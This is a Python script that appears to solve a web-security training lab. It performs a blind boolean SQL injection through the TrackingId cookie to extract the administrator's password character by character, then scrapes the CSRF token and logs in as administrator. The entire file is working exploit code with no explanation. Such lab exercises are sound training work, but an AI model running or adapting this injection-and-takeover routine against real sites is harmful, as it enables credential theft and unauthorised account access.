import re
import sys
import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'

session = requests.Session()

def get_initial_cookies(url):
    response = session.get(url, verify=False)
    cookies = response.cookies.get_dict()
    return cookies.get('session'), cookies.get('TrackingId')

session_token, tracking_id = get_initial_cookies(burp_url)

def sqli_password(url, session_token, tracking_id):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            try:
                sqli_payload = "' AND (SELECT SUBSTRING(password,%s,1) FROM users WHERE username='administrator')='%s" % (i, chr(j))
                sqli_payload_encode = urllib.parse.quote(sqli_payload)
                cookies = {'TrackingId': tracking_id + sqli_payload_encode, 'session': session_token}
                r = session.get(url, cookies=cookies, verify=False)
                
                if "Welcome back" in r.text:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()

            except requests.RequestException:
                continue

            except Exception:
                continue

    return password_extracted

admin_passwd = sqli_password(burp_url, session_token, tracking_id)
print("\nAdmin Password: ", admin_passwd)

response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)
burp_data = {"csrf": csrf, "username": "administrator", "password": admin_passwd}
session.post(login_url, data=burp_data)
